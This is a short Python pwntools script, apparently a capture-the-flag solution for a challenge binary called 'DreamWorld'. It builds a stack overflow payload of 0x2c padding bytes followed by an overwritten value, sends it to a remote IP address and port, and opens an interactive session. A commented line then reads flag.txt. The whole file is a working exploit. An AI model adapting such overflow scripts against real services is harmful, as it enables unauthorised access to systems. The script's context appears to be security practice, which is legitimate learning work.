from pwn import *

data = b'a' * 0x2c + p64(0xdeadbeef) 
# print(data)
# print(type(data))

# io = process("./DreamWorld")
io = remote("3.18.62.210", 11001)
print(io.readline())
io.sendline(data)
print(io.readline())
io.interactive()
# io.sendline(b"cat flag.txt")
# print(io.readline())
